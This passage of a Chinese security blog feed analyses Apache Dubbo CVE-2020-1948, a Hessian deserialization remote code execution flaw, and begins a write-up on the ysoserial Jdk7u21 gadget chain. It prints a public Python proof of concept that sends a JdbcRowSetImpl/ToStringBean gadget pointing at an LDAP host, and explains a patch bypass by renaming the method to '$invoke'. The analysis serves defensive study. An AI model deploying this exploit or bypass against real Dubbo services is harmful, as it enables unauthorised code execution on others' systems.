alt="1"></p><ul><li><p><strong>Provider</strong></p><ul><li>暴露服务方称之为“服务提供者”</li></ul></li><li><p><strong>Consumer</strong></p><ul><li>调用远程服务方称之为“服务消费者”</li></ul></li><li><p><strong>Registry</strong></p><ul><li>服务注册与发现的中心目录服务称之为“服务注册中心”</li></ul></li><li><p><strong>Monitor</strong></p><ul><li>统计服务的调用次调和调用时间的日志服务称之为“服务监控中心”</li></ul></li><li><p><strong>Container</strong> </p><ul><li>服务运行容器。</li></ul></li></ul><p>Provider将本地提供的远程方法在注册中心进行注册，Consumer需要调用时会先去注册中心进行查询，根据注册中心返回的结果再去对应的Provider中调用对应的远程方法，如果有变更，注册中心将基于长连接推送变更数据给Consumer 。</p><p>启动注册中心，Apache dubbo 推荐使用的注册中心时Apache ZooKeeper注册中心 下载地址<a href="https://zookeeper.apache.org/releases.html" target="_blank" rel="noopener">https://zookeeper.apache.org/releases.html</a></p><p>启动ZooKeeper之前可以自定义修改 “/conf/zoo.cfg”配置文件里的 clientPort和dataDir的值。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/2.png" alt="2"></p><p>Apache Dubbo有一个web端的管理界面 github地址如下<a href="https://github.com/apache/dubbo-admin" target="_blank" rel="noopener">https://github.com/apache/dubbo-admin</a></p><p>下载完成后进入/dubbo-admin-server/src/main/resources目录修改application.properties配置文件，将其中的注册中心地址修改为自己启动的注册中心的地址</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/3.png" alt="3"></p><p>dubbo-admin-server 目录下运行 mvn package -Dmaven.test.skip=true 将该模块打包成jar包</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/4.png" alt="4"></p><p>然后 java -jar dubbo-admin-server-0.2.0-SNAPSHOT.jar 启动dubbo-admin-server，此时启动了 dubbo管理的服务端但是没有UI界面。</p><p>进入到 dubbo-admin-ui 中 执行 npm install 该命令执行完成后 执行npm run dev 。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/5.png" alt="5"></p><p>访问<a href="http://localhost:8081" target="_blank" rel="noopener">http://localhost:8081</a> 此时就有了UI界面，默认账号密码都是root，在服务查询中 我们可以看到Provider在Zookeeper注册中心中注册的远程方法服务，目前没有注册所以无可用数据。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/6.png" alt="6"></p><p>启动我们使用dubbo框架写的程序</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/7.png" alt="7"></p><p>可以看到我们的远程方法服务成功在zookeeper注册中心进行注册</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/8.png" alt="8"></p><h2 id="CVE-2020-1948-深度分析"><a href="#CVE-2020-1948-深度分析" class="headerlink" title="CVE-2020-1948 深度分析"></a>CVE-2020-1948 深度分析</h2><p>首先观察一下网上已经公布的POC的代码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> hessian2 <span class="token keyword">import</span> new_object<span class="token keyword">from</span> client <span class="token keyword">import</span> DubboClientclient <span class="token operator">=</span> DubboClient<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">20880</span><span class="token punctuation">)</span>JdbcRowSetImpl<span class="token operator">=</span>new_object<span class="token punctuation">(</span>      <span class="token string">'com.sun.rowset.JdbcRowSetImpl'</span><span class="token punctuation">,</span>      dataSource<span class="token operator">=</span><span class="token string">"ldap://127.0.0.1:8087/ExploitMac"</span><span class="token punctuation">,</span>      strMatchColumns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"fxx"</span><span class="token punctuation">]</span>      <span class="token punctuation">)</span>JdbcRowSetImplClass<span class="token operator">=</span>new_object<span class="token punctuation">(</span>      <span class="token string">'java.lang.Class'</span><span class="token punctuation">,</span>      name<span class="token operator">=</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span>toStringBean<span class="token operator">=</span>new_object<span class="token punctuation">(</span>      <span class="token string">'com.rometools.rome.feed.impl.ToStringBean'</span><span class="token punctuation">,</span>      beanClass<span class="token operator">=</span>JdbcRowSetImplClass<span class="token punctuation">,</span>      obj<span class="token operator">=</span>JdbcRowSetImpl      <span class="token punctuation">)</span>resp <span class="token operator">=</span> client<span class="token punctuation">.</span>send_request_and_return_response<span class="token punctuation">(</span>    service_name<span class="token operator">=</span><span class="token string">'com.example.provider.service.UesrService'</span><span class="token punctuation">,</span>    method_name<span class="token operator">=</span><span class="token string">'test'</span><span class="token punctuation">,</span>    args<span class="token operator">=</span><span class="token punctuation">[</span>toStringBean<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>不难看出，该漏洞利用链最终是通过JdbcRowSetImpl调用jndi来进行远程代码执行。同时我们发现该gadget中用到了com.rometools.rome.feed.impl.ToStringBean，所以Provider的pom.xml中需要添加rometools的引用</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.rometools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>通过wireshark抓包来看一下 POC发出的报文内容</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/9.png" alt="9"></p><p>我们将断点打在 org.apache.dubbo.remoting.transport.DecodeHandler 的第57行代码上。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/10.png" alt="10"></p><p>跟进该方法后可以看到该方法内首先会进行一个if判断，判断完成后会调用DecodeableRpcInvocation.decode()方法并传递进去两个参数，其中有一个inputStream参数，我们详细看一下该参数的内容</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/11.png" alt="11"></p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/12.png" alt="12"></p><p>可以看到正是我们通过POC发送的序列化数据</p><p>跟进该方法，在第131行代码处有一个if判断，这里通过RefctUtils.desc2classArray()处理完desc参数然后返回一个ToStringBean的类对象。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/13.png" alt="13"></p><p>紧接着通过Hessian将ToStringBean的类对象反序列化成ToStringBean对象并赋值给args参数</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/14.png" alt="14"></p><p>仔细观察一下此时args指向的ToStringBean对象的详细内容，可见此时ToStringBean对象有两个属性已经被赋值为JdbcRowSetImpl。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/15.png" alt="15"></p><p>当前方法执行完成后 args参数和pts参数分别被赋值给当前对象的arguments属性和parameterTypes属性，然后当前DecodeableRpcInvocation作为参数进行返回</p><p>返回到DecodeHandler中，在第51行代码中传入的message参数是一个Request对象，该Request对象是dubbo的包中的，简单看一下该对象的详细信息</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/16.png" alt="16"></p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/17.png" alt="17"></p><p>跟进该方法，然后继续跟进handleRequest()方法。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/18.png" alt="18"></p><p>在DubboProtocol类的第263行代码中经过一个if判断然后判断成功会抛出一个RemotingException，关键点就在这里，可以看到传入的参数中采用了字符串拼接的形式，当使用字符串拼接的时候，会自动调用StringBuilder的对象的append方法，依次处理channel.getRemoteAddress()的返回值，channel.getLocalAddress()的返回值，getInvocationWithoutData(inv)的返回值，而getInvocationWithoutData(inv)的返回值正式含有恶意请求的DecodeableRpcInvocation对象，StringBuilder要调用DecodeableRpcInvocation的toString方法将其转化为字符串</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/19.png" alt="19"></p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/20.png" alt="20"></p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/21.png" alt="21"></p><p>DecodeableRpcInvocation类的父类RpcInvocation重写了toString方法，看一下RpcInvocation.toString()方法的实现</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/22.png" alt="22"></p><p>同样还是字符串拼接，其中Arrays.toString(arguments)，agruments正是之前封装进DecodeableRpcInvocation对象中的ToStringBean对象。接下来自然会调用ToStringBean.toString()方法。</p><p>ToStringBean.toString()方法，执行时取出其中的obj属性获取其类名称，并作为参数传入另一个重写的toString方法</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/23.png" alt="23"></p><p>该toString方法中会通过反射不断调用JdbcRowSetImpl对象的各个方法，当反射调用JdbcRowSetImpl对象的getDatabaseMetaData方法时，会触发JDNI远程访问dataSource</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/24.png" alt="24"></p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/25.png" alt="25"></p><p>我们可以看到dataSource的值</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/26.png" alt="26"></p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/27.png" alt="27"></p><p>至此Apache dubbo (CVE-2020-1948) 反序列化远程代码执行漏洞原理分析完毕</p><h2 id="补丁绕过分析"><a href="#补丁绕过分析" class="headerlink" title="补丁绕过分析"></a>补丁绕过分析</h2><p>这次针对该漏洞的补丁非常简单，在分析该漏洞时说过在DecodeableRpcInvocation类的第131行有一个if 判断，以下是2.7.6版本中该判断的代码</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/13.png" alt="28"></p><p>更新后的2.7.7版本该判断的代码如下，可见在该判断內有增加了一个if 判断，且新增加的判断如果判断失败则会抛出IllegalArgumentException异常终止当前线程的执行。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/28.png" alt="29"></p><p>那么如何绕过该判断让程序继续执行下去从而触发远程代码执行，我们跟入RpcUtils.isGenericCall()方法中来仔细观察。</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/29.png" alt="30"></p><p>不难发现该方法内用仅仅只用String.equals方法对比了method参数是否和$INVOKE常量或者$INVOKE_ASYNC常量的值相同。</p><p>我门看一下两个常量的值</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/30.png" alt="31"></p><p>我们此时 method的值为“test”可见并不相同，紧接着进入RpcUtils.isEcho()方法，同样是和常量进行对比，显然结果也不相同</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/31.png" alt="32"></p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/32.png" alt="33"></p><p>所以if 判断内的最终结果为true，从而抛出异常终止执行。绕过的方法相比大家也都想到了，我们只要让method的值等于“$invoke”，“$invokeAsync”，“$echo”任意一个即可绕过。我们返回POC中查看与method对应的值是哪一个</p><p><img src="/2020/07/03/apache-dubbo-cve-2020-1948-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-ji-qi-bu-ding-rao-guo-shen-du-fen-xi/33.png" alt="34"></p><p>一眼就能发现其中的method_name就是我们要找的，我们只需要修改‘test’为‘$invoke’即可对当前补丁进行绕过。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此次漏洞是序列化传输到后台的数据被翻序列化完成后，在后续的处理过程中的一个异常处理中进行了危险操作，从而触发了gadget。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> Apache Dubbo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化系列ysoserialJdk7u21</title>
      <link href="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/"/>
      <url>/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化系列-ysoserial-Jdk7u21"><a href="#Java反序列化系列-ysoserial-Jdk7u21" class="headerlink" title="Java反序列化系列 ysoserial Jdk7u21"></a>Java反序列化系列 ysoserial Jdk7u21</h1><h2 id="1-Jdk7U21漏洞简介"><a href="#1-Jdk7U21漏洞简介" class="headerlink" title="1.Jdk7U21漏洞简介"></a>1.Jdk7U21漏洞简介</h2><p>谈到java的反序列化，就绕不开一个经典的漏洞，在ysoserial 的payloads目录下 有一个jdk7u21，以往的反序列化Gadget都是需要借助第三方库才可以成功执行，但是jdk7u21的Gadget执行过程中所用到的所有类都存在在JDK中，JRE版本&lt;=7u21都会存在此漏洞</p><h2 id="2-Jdk7u21漏洞原理深入讲解"><a href="#2-Jdk7u21漏洞原理深入讲解" class="headerlink" title="2.Jdk7u21漏洞原理深入讲解"></a>2.Jdk7u21漏洞原理深入讲解</h2><h3 id="2-1漏洞执行流程"><a href="#2-1漏洞执行流程" class="headerlink" title="2.1漏洞执行流程"></a>2.1漏洞执行流程</h3><p>整体的恶意对象的封装整理成了脑图，如下图所示</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/1.png" alt="1"></p><p>这里用到了TemplatesImpl对象来封装我们的恶意代码，其封装和代码执行的流程在<a href="https://mp.weixin.qq.com/s/O1ay4BHiyPBkotNIgDQ6Kg" target="_blank" rel="noopener">《Java 反序列化系列 ysoserial Hibernate1》</a>中针对这种利用已经进行了详细的讲解，基本原理是通过动态字节码生成一个类，该类的静态代码块中存储有我们所要执行的恶意代码，最终通过TemplatesImpl.newTransformer()实例化该恶意类从而触发其静态代码块中的恶意代码，关于TemplatesImpl的详细分析可以去查看java 反序列化系列 Hibernate1中去学习了解。</p><p>首先最外层的是LinkedHashSet 类，看过该类源码的同学应该都清楚，该类其实是基于HashMap实现的。我们首先来看LinkedHashSet的readObject方法。</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Read in any hidden serialization magic</span>        s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read in HashMap capacity and load factor and create backing HashMap</span>        <span class="token keyword">int</span> capacity <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">float</span> loadFactor <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readFloat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HashSet<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">LinkedHashSet</span> <span class="token operator">?</span>               <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span>E<span class="token punctuation">,</span>Object<span class="token operator">></span><span class="token punctuation">(</span>capacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span> <span class="token operator">:</span>               <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>E<span class="token punctuation">,</span>Object<span class="token operator">></span><span class="token punctuation">(</span>capacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read in size</span>        <span class="token keyword">int</span> size <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read in all elements in the proper order.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            E e <span class="token operator">=</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> PRESENT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>该方法最后可以看到有一个for循环，将LinkedHashSet对象在序列化时一个一个被序列化的元素在反序列化回来。该循环体中有一行代码 <code>map.put(e,PRESENT)</code> 这里的map变量指向的是一个LinkedHashMap对象，PRESENT常量的值是一个空的Object对象由下图可知</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/2.png" alt="2"></p><p>此时的变量e指向的是我们实现封装进LinkedHashSet里的TemplatesImpl对象，里面存有我们的恶意代码</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/3.png" alt="3"></p><p>接下来我们来看LinkedHashMap.put方法的实现</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">putForNullKey</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> null<span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object k<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            V oldValue <span class="token operator">=</span> e<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">recordAccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">addEntry</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>大概流程就是判断其key值的hash是否一致 如果不一致则证明是一个新的元素从而加入到当前的HashMap对象中，如果hash一致则进行判断该元素是否存在于当前的HashMap中如果存在则返回oldValue,如果不存在则加入当前HashMap对象中。</p><p>这里核心关键点就是如何让程序执行到key.equals，此时的key指向的是我们通过动态代理生成的Proxy对象，我们知道调用Proxy对象的任何方法，本质上都是在调用，InvokcationHandler 对象中被重写的invoke方法。因为生成Proxy对象时传入的参数是InvokcationHandler的子类AnnotationInvocationHandler，所以自然要调用AnnotationInvocationHandler.invoke()方法。</p><p>我们来看该方法的具体实现<img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/4.png" alt="4"></p><p>通过观察代码我们可以看到接下来会调用equalsImpl()方法，传入的var3参数是封装了我们恶意代码的TemplatesImpl对象</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> Boolean <span class="token function">equalsImpl</span><span class="token punctuation">(</span>Object var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        Method<span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getMemberMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var4 <span class="token operator">&lt;</span> var3<span class="token punctuation">;</span> <span class="token operator">++</span>var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Method var5 <span class="token operator">=</span> var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">;</span>            String var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Object var7 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>            Object var8 <span class="token operator">=</span> null<span class="token punctuation">;</span>            AnnotationInvocationHandler var9 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">asOneOfUs</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var9 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                var8 <span class="token operator">=</span> var9<span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>在这里我们可以看到有这么一行代码<code>var8 = var5.invoke(var1);</code>这里就会调用TemplatesImpl.newTransformer()从而实例化恶意类，这里的var1我们清楚是我们传递进来的TemplatesImpl对象，但是var5的结果是怎么来的还需要分析一下。</p><p>从代码中可以看到<code>Method var5 = var2[var4];</code> var4=0  而<code>var2= this.getMemberMethods()；</code></p><p>跟入getMemberMethods()方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> Method<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getMemberMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>memberMethods <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>memberMethods <span class="token operator">=</span> <span class="token 